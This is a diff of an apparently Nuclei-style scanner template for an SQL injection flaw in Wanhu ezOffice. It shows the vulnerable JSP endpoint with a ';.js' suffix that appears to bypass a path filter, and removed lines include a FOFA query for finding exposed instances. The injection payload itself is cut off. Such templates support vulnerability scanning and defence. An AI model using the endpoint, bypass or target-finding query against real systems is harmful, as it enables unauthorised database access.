@@ -3,12 +3,8 @@ info:
   name: 万户ezOffice name_judge存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ngqaxzrkzfdfbgyd'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ngqaxzrkzfdfbgyd
-    fofa: 'title="万户ezOFFICE协同管理平台" || title="ezOFFICE协同管理平台" || title="Wanhu ezOFFICE"    || title="ezOffice for iPhone" || body="EZOFFICEUSERNAME" || body="whirRootPath"    || body="/defaultroot/js/cookie.js" '
 http:
 - raw:
   - 'POST /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js HTTP/1.1
